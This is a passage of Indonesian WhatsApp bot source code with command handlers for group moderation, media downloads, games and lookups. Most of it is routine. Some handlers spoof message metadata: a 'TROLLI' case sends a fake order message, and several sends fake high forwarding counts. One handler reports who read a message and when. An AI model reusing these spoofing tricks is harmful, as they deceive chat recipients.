break
// Set Anti Link ( HW MODS WA )
case 'setlink':
if (!mek.key.fromMe && !isOwner) return
if (args[0] === "com") {
linknye = `${linkcom}`
freply('Succes change antilink com')
} else if (args[0] === "id") {
linknye = `${linkid}`
freply('Succes change antilink id')
} else if (args[0] === "xyz") {
linknye = `${linkxyz}`
freply('Succes change antilink xyz')
} else if (args[0] === "http") {
linknye = `${linkhttp}`
freply('Succes change antilink http')
} else if (args[0] === "ly") {
linknye = `${linkly}`
freply('Succes change antilink ly')
} else if (args[0] === "wa") {
linknye = `${linkwa}`
freply('Succes change antilink wa')
} else if (args[0] === "default") {
linknye = `${deflt}`
freply('Succes change antilink default')
} else {
reply(`*List Anti Link*\n•> com\n•> id\n•> xyz\n•> ly\n•> http\n•> wa\n•> default`)
}
break
// Anti Link ( HW MODS WA )
case 'antilink':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !mek.key.fromMe && !isOwner) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (args.length < 1) return reply('ketik 1 untuk mengaktifkan\nketik 0 untuk menonaktifkan')
if (args[0] === "1") {
if (AntiLink) return reply('Sudah Aktif')
ntilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(ntilink))
freply('Succes menyalakan antilink di group ini')
Haikal.sendMessage(from, `PERINGATAN!!! jika bukan admin jangan send link di group ini`, text)
} else if (args[0] === "0") {
if (!AntiLink) return reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(ntilink))
freply('Succes mematikan antilink di group ini')
} else {
reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
}
break
// Block List ( HW MODS WA & Nurutomo )
case 'blocklist':
let blockede = Haikal.blocklist.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != Haikal.user.jid)
Haikal.reply(m.chat, `┌「 *List Blockir* 」` + `\n` + blockede.map((v, i) => `│ ${i + 1}. @${v.split`@`[0]}`).join`\n` + `\n└────`, m, { contextInfo: { mentionedJid: blocked } })
break
// Detik Vn ( HW MODS WA & Denis )
case 'detikvn':
if (!isQuotedAudio) return reply('Reply audionya')
if (args.length < 1) return reply('Masukan Detik')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await Haikal.downloadAndSaveMediaMessage(encmedia)
cokmatane = Number(args[0])
hah = fs.readFileSync(media)
Haikal.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
fs.unlinkSync(media)
break
// Detik Video ( HW MODS WA & Denis )
case 'detikvideo':
if (!isQuotedVideo) return reply('Reply videonya')
if (args.length < 1) return reply('Masukan Detik')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await Haikal.downloadAndSaveMediaMessage(encmedia)
cokmatane = Number(args[0])
hah = fs.readFileSync(media)
Haikal.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
fs.unlinkSync(media)
break
// Sider ( HW MODS WA )
case 'sider':
try {
if (!isGroup) return reply('Hanya bisa didalam gruop')
if (!isQuotedReply) return reply('Reply pesan botnya')      
infom = await Haikal.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
hemm = infom.reads
hemms = infom.deliveries
readon = hemms.map(v => v.jid)
readdin = hemm.map(v => v.jid)
stamp = hemm.map(v => v.t)
      
function toTime(UNIX_timestamp, ribuan){
ribuan = (typeof ribuan == 'undefined') ? false : true;

let a = new Date(UNIX_timestamp);
if (ribuan) {
a = new Date(UNIX_timestamp * 1000);
} 	
// ambil pecahan waktu masing-masing
var hour = a.getHours();
var min = a.getMinutes();
var sec = a.getSeconds();
// gabungkan ke dalam variable time
var time = `${hour}:${min}:${sec}` ;
return time;
}

function toBulan(UNIX_timestamp, ribuan){
ribuan = (typeof ribuan == 'undefined') ? false : true;

let a = new Date(UNIX_timestamp);
if (ribuan) {
a = new Date(UNIX_timestamp * 1000);
} 
//buat index bulan
var months = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember'];
var myDays = ['Minggu','Senin','Selasa','Rabu','Kamis','Jum at','Sabtu'];  
// tanggal
var day = a.getDate()
bulanee = a.getMonth()
var thisDay = a.getDay(),
thisDay = myDays[thisDay];
var yy = a.getYear()
var year = (yy < 1000) ? yy + 1900 : yy;
var bul = `${thisDay}, ${day} - ${months[bulanee]} - ${year}` ;
return bul;
}
teksx = `「 *List Read Message* 」\n\n`
for (let i of hemm) {
teksx += `•> Nama : @${i.jid.split('@')[0]}\n•> Waktu : ${toTime(i.t, true)}\n•> Tanggal : ${toBulan(i.t, true)}\n\n`
}
teksx1 = `「 *List Deliveries To* 」\n\n`
for (let i of hemms){
teksx1 += `•> Nama : @${i.jid.split('@')[0]}\n`
teksx1 += `•> Waktu : ${toTime(i.t, true)}\n•> Tanggal : ${toBulan(i.t, true)}\n\n`
}
Haikal.sendMessage(from, teksx, text, { sendEphemeral: true, quoted: mek, thumbnail: Bfake, contextInfo: { forwardingScore:999, isForwarded:true, mentionedJid: readdin }})
Haikal.sendMessage(from, teksx1, text, { sendEphemeral: true, quoted: mek, thumbnail: Bfake, contextInfo: { forwardingScore:999, isForwarded:true, mentionedJid: readon }})
} catch(e) {
reply('reply pesan botnya goblok bukan pesan orang')
reply(e)
console.log(e)
}
break
// Photooxy ( HW MODS WA )
case 'phy':
if (args.length < 1) return reply(`Example :\n${prefix}phy <name>`)
if (args[0] === 'glitch') {
if (args.length < 2) return reply(`Example :\n${prefix}phy glitch HAIKAL|Hacker 404`)
var cv = body.slice(12)
var quer = cv.split("|")[0];
var quer1 = cv.split("|")[1];
reply(mess.wait)
ph.pGlitch(quer, quer1).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else if (args[0] === 'coffecup') {
if (args.length < 2) return reply(`Example :\n${prefix}phy coffecup HAIKAL`)
anu = body.slice(14)
reply(mess.wait)
ph.pCoffeCup(anu).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else if (args[0] === 'shadow') {
if (args.length < 2) return reply(`Example :\n${prefix}phy shadow HAIKAL`)
anu = body.slice(12)
reply(mess.wait)
ph.pShadow(anu).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else if (args[0] === 'neon') {
if (args.length < 2) return reply(`Example :\n${prefix}phy neon HAIKAL`)
anu = body.slice(9)
reply(mess.wait)
ph.pNeons(anu).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else if (args[0] === 'wanted') {
if (args.length < 2) return reply(`Example :\n${prefix}phy wanted https://telegra.ph/file/af4038f3cd8db3831aa28.jpg|HAIKAL|Hacker 404`)
var cv = body.slice(12)
var uri = cv.split("|")[0];
var quer = cv.split("|")[1];
var quer1 = cv.split("|")[2];
reply(mess.wait)
ph.pWanted(uri, quer, quer1).then(res => {
sendMediaURL(from, `${res.url}`, 'Dah jadi ngab')
})
} else {
reply(`*List Photooxy :*\n•> glitch\n•> coffecup\n•> shadow\n•> wanted\n•> neon`)
}
break
// Get Pic ( HW MODS WA )
case 'getp':
try {
pic = await Haikal.getProfilePicture(from)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
Haikal.sendMessage(from, thumb, MessageType.image, {quoted: mek, caption: "Nih kak..."})
break
// Get Pic ( HW MODS WA )
case 'getpic':
if (mek.message.extendedTextMessage != undefined){
mentioned = mek.message.extendedTextMessage.contextInfo.participant
try {
pic = await Haikal.getProfilePicture(mentioned)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
Haikal.sendMessage(from, thumb, MessageType.image, {quoted: mek, caption: "Nih kak..."})
} else if (args[0]) {
try {
pic = await Haikal.getProfilePicture(args[0])
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
Haikal.sendMessage(from, thumb, MessageType.image, {quoted: mek, caption: "Nih kak..."})
} else {
reply(`Example :\n${prefix}${command} 62xxx\n${prefix}${command} <reply>`)
}
break
// Get Bio ( HW MODS WA )
case 'getbio':
var yy = mek.message.extendedTextMessage.contextInfo.participant
var p = await Haikal.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply("Status Profile Not Found")
}
break
// Get Name ( HW MODS WA )
case 'getname':
var ambl = mek.message.extendedTextMessage.contextInfo.participant
const sname = Haikal.contacts[ambl] != undefined ? Haikal.contacts[ambl].sname || Haikal.contacts[ambl].notify : undefined
reply(sname)
break
// Restart Bot ( HW MODS WA )
case 'restart':
if (!mek.key.fromMe && !isOwner) return
reply('Restart...')
await exec(`pm2 restart main`, (err, stdout) => {
if (err) return Haikal.sendMessage(from, `${err}`, text, { quoted: mek })
if (stdout) {
console.log('Restart...')
}
})
console.log(stdout)
break
// Play Store ( HW MODS WA & HAIKALz )
case 'playstore':
if (args.length < 1) return reply(`Example :\n${prefix}playstore termux`)
quer = args.join(" ")
hx.playstore(quer).then(res => {
teks = '```「 Play Store 」```'
for (let i of res) {
teks += `\n\n${i.name}\n`
teks += `${i.link}\n`
teks += `${i.developer}`
}
reply(teks)
})
break
// Search Gc ( HW MODS WA & HAIKALz )
case 'searchgc':
if (args.length < 1) return reply(`Example :\n${prefix}searchgc Editor Berkelas`)
nae = args.join(" ")
hx.linkwa(nae).then(res => {
teks = '```「 Search Group 」```'
for (let i of res) {
teks += `\n\n•> Group Whatsapp :\n`
teks += `${i.link}\n`
teks += `${i.nama}`
}
reply(teks)
})
break
// Status Tictactoe ( HW MODS WA )
case 'cekhistory':
reply(`\`\`\`「 Status Tictactoe 」\`\`\`\n•> Win : ${checkWin(sender)}\n•> Lose : ${checkLose(sender)}`)
break
// Delete Sesi ( HW MODS WA )
case 'delsesi':
if (!isGroupAdmins && !mek.key.fromMe && !isOwner) return reply('Hanya bisa didelete oleh admin group dan owner bot')
if (args[0] === 'ttt') {
delete tictactoe[senderNumber]
fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))                        
if (fs.existsSync('./temp/' + from + '.json')) {
fs.unlinkSync('./temp/' + from + '.json')
reply('Berhasil Menghapus Sesi Ttt')
} else {
reply('Tidak ada sesi yang berlangsung')
}
} else {
reply('Pilih')
}
break
// Tictactoe ( HW MODS WA )
case 'tictactoe':
case 'ttt':
if (!isGroup)return reply('*Khusus group*')
if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
if (fs.existsSync(`./temp/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}deletesesi-ttt*, untuk menghapus sesi`)
if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
tttSkuy = setTtt(`${from}`)
tttSkuy.status = false
tttSkuy.Z = sender.replace("@s.whatsapp.net", "")
tttSkuy.Y = args[0].replace("@", "");
fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
starGame = `「 *Memulai Game Tictactoe* 」\n\n•@${sender.replace("@s.whatsapp.net", "")} Menantang Bermain Tictactoe \n[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan\n\n_Game tictactoe recode HAIKAL_`
Haikal.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
break
// Twitter Downloader ( HW MODS WA )
case 'twmp4':
if (args.length < 1) return reply('Link?')
lin = args[0]
freply(mess.wait)
hx.twitter(lin).then(res => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = Mthumb
Haikal.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP4*\n\n•> Hd : ${res.HD}\n•> Sd : ${res.SD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
// Twitter Downloader ( HW MODS WA )
case 'twmp3':
if (args.length < 1) return reply('Link?')
lin = args[0]
freply(mess.wait)
hx.twitter(lin).then(async (res) => {
console.log('[ TWITTER ] downloader')
Anu = res.SD
fto = Mthumb
Haikal.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP3*\n\n•> Hd : ${res.HD}\n•> Sd : ${res.SD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(Anu)
Haikal.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'Haikalgan.mp3', quoted:mek, ptt:true})
})
break
// Surah Al-Qur'an ( HW MODS WA & HAIKALz )
case 'surah':
if (!mek.key.fromMe && !isOwner) return
if (args.length < 1) return reply(`Example :\n${prefix}surah 1`)
srh = args[0]
hx.surah(srh).then(res => {
teks = '```「 AL-QURAN 」```\n\n_Lebih baik baca di al-qurannya langsung biar berkah, kalo dihp gk berkah_\n\n'
for (let i of res) {
teks += '*•> Arab :* ' + i.arab + '\n'
teks += '*•> Indo :* ' + i.indo + '\n'
teks += '*•> Latin :* ' + i.latin + '\n\n'
}
reply(teks)
})
break
// Style Text ( HW MODS WA & Nurutomo )
case 'styletext':
if (args.length < 1) return reply('Enter The Text')
async function stylizeText(text) {
let res = await fetch('http://qaz.wtf/u/convert.cgi?text=' + encodeURIComponent(text))
let html = await res.text()
let dom = new JSDOM(html)
let table = dom.window.document.querySelector('table').children[0].children
let obj = {}
for (let tr of table) {
let name = tr.querySelector('.aname').innerHTML
let content = tr.children[1].textContent.replace(/^\n/, '').replace(/\n$/, '')
obj[name + (obj[name] ? ' Reversed' : '')] = content
}
return obj
}
matext = args.join(" ")
let fetch = require('node-fetch')
let { JSDOM } = require('jsdom')
Haikal.reply(m.chat, Object.entries(await stylizeText(matext)).map(([name, value]) => `\`\`\`「 ${name} 」\`\`\`\n\n${value}\n\n—————————————————————————`).join`\n\n`, m)
break
// Set Prefix ( HW MODS WA )
case 'setprefix':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return fakegroup(`Example:\n•> ${prefix}setprefix multi\n•> ${prefix}setprefix <query>`)
if (args[0] === 'multi') {
if (multi === true) return
multi = true
fakegroup(`\`\`\`Succes change prefix =「 Multi Prefix 」\`\`\``)
} else {
multi = false
pref = args[0]
fakegroup(`\`\`\`Succes change prefix =「 ${args[0]} 」\`\`\``)
}
break
// Tag ( HW MODS WA )
case 'tag':
noes = `${args[0]}@s.whatsapp.net`
beks = `@${noes.split("@")[0]}`
Haikal.sendMessage(from, beks, text, {quoted:mek, contextInfo:{mentionedJid:[noes]}})                
break
// Copy Paste ( HW MODS WA & Nurutomo )
case 'q': 
if (!m.quoted) return reply('reply message!')
let qse = Haikal.serializeM(await m.getQuotedObj())
if (!qse.quoted) return reply('the message you replied does not contain a reply!')
await qse.quoted.copyNForward(m.chat, true)
break
// Happy Birth Day ( HW MODS WA & Franky )
case 'hbd': 
let textus = args.join(" ")
if (!q) return reply(`Example:\n 2002 02 25`)
const zodiak = [
    ["Capricorn", new Date(1970, 0, 1)],
    ["Aquarius", new Date(1970, 0, 20)],
    ["Pisces", new Date(1970, 1, 19)],
    ["Aries", new Date(1970, 2, 21)],
    ["Taurus", new Date(1970, 3, 21)],
    ["Gemini", new Date(1970, 4, 21)],
    ["Cancer", new Date(1970, 5, 22)],
    ["Leo", new Date(1970, 6, 23)],
    ["Virgo", new Date(1970, 7, 23)],
    ["Libra", new Date(1970, 8, 23)],
    ["Scorpio", new Date(1970, 9, 23)],
    ["Sagittarius", new Date(1970, 10, 22)],
    ["Capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
    let d = new Date(1970, month - 1, day)
    return zodiak.find(([_,_d]) => d >= _d)[0]
}
    const date = new Date(textus)
    if (date == 'Invalid Date') throw date
    const d = new Date()
    const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
    const birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
    
    const zodiac = getZodiac(birth[1], birth[2])
    const ageD = new Date(d - date)
    const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

    const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
    const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday 🥳🎉` : age

    const teksh = `
Birth : ${birth.join('-')}
Upcoming hbd : ${birthday.join('-')}
Age : ${cekusia}
Zodiak : ${zodiac}
`.trim()
    m.reply(teksh)
break
// Leave Group ( HW MODS WA )
case 'leave':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply(`\`\`\`Example :\`\`\`\n\`\`\`${prefix}leave <id>\`\`\``)
ids = args.join(" ")
try {
Haikal.groupLeave(ids)
reply(`Succes leave group ${ids}`)
} catch(e) {
reply('Error!')
}
break
// List Group ( HW MODS WA & Nurutomo )
case 'listgroup':
case 'listgrup':
case 'listgrop':
case 'gruplist':
case 'groplist':
case 'grouplist':
const txs = Haikal.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`•> ${Haikal.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n~~\n`
Haikal.sendMessage(m.chat, '```「 List Groups 」```\n\n' + txs, text)
break
// Search Text ( HW MODS WA )
case 'searchtext':
if (args.length < 1) return reply(`${a}Wrong Format${a} What Message Are You Looking For Bro??\Example : ${prefix}searchtext halo|10`)
tekse = args.join('')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 15) return reply('minimum 15')
sampai = `${za}`
batas = parseInt(sampai) + 1
cok = await Haikal.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Message Not Found') 
if (cok.messages.length < parseInt(batas)) reply(`Found Only ${cok.messages.length - 1} Messages`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
Haikal.sendMessage(from, `Here The Message!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
return reply(`${a}ERROR${a} An error occurred while searching for Messages`)
}
} else {
reply(`Wrong format, this is an example of the correct format : ${prefix}searchtext halo|15`)
}
break
// Group Open / Close ( HW MODS WA )
case 'group':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
if (args[0] === 'open') {
reply(`*SUCCES OPEN GROUP*`)
Haikal.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'close') {
reply(`*SUCCES CLOSE GROUP*`)
Haikal.groupSettingChange(from, GroupSettingChange.messageSend, true)
}
break
// Set Description Group ( HW MODS WA )
case 'setdesc':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
Haikal.groupUpdateDescription(from, `${args.join(" ")}`)
Haikal.sendMessage(from, 'Succes change description group', text, {quoted:mek})
break
// Set Name Group ( HW MODS WA )
case 'setname':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
Haikal.groupUpdateSubject(from, `${args.join(" ")}`)
Haikal.sendMessage(from, 'Succes change name group', text, {quoted:mek})
break
// Group Info ( HW MODS WA )
case 'groupinfo':
if (!isGroup) return
ppUrl = await Haikal.getProfilePicture(from) // leave empty to get your own
buffergbl = await getBuffer(ppUrl)
Haikal.sendMessage(from, buffergbl, image, {quoted: mek, caption: `\`\`\`「 Group Info 」\`\`\`\n*•> Name* : ${groupName}\n*•> Member* : ${groupMembers.length}\n*•> Admin* : ${groupAdmins.length}\n*•> Description* : \n${groupDesc}`})
break
// Demote Admins ( HW MODS WA )
case 'demote':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply members')
mentionede = mek.message.extendedTextMessage.contextInfo.participant
Haikal.groupDemoteAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes demote`
Haikal.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[mentionede]}})
break
// Promote Members ( HW MODS WA )
case 'promote':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply members')
mentionede = mek.message.extendedTextMessage.contextInfo.participant
Haikal.groupMakeAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes promote`
Haikal.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[mentionede]}})
break
// Revoke Link Group ( HW MODS WA )
case 'revoke':
if (!mek.key.fromMe && !isOwner && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
Haikal.revokeInvite(from)
reply('```Succes revoke link group```')
break
// Trolli ( HW MODS WA & Franky )
case 'p': // TROLLI
res = await Haikal.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": "-150453297177375",
"thumbnail": "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